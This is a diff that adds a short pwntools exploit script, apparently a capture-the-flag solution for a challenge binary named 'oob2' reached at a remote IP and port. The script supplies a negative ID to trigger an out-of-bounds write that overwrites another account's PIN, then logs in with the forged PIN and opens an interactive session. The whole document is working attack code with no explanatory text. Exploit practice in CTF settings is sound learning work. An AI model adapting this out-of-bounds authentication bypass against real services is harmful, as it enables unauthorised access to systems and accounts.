@@ -1,0 +1,17 @@
+from pwn import *
+
+r = remote('140.110.112.77', 3112)
+#r = process('oob2')
+r.recvuntil('ID: ')
+r.sendline('-4')
+r.recvuntil('Nickname: ')
+r.sendline(p32(0x11111111))
+r.recvuntil('PIN: ')
+r.sendline(str(10))
+r.recvuntil('ID: ')
+r.sendline('0')
+r.recvuntil('Nickname: ')
+r.sendline('aa')
+r.recvuntil('PIN: ')
+r.sendline(str(0x11111111))
+r.interactive()
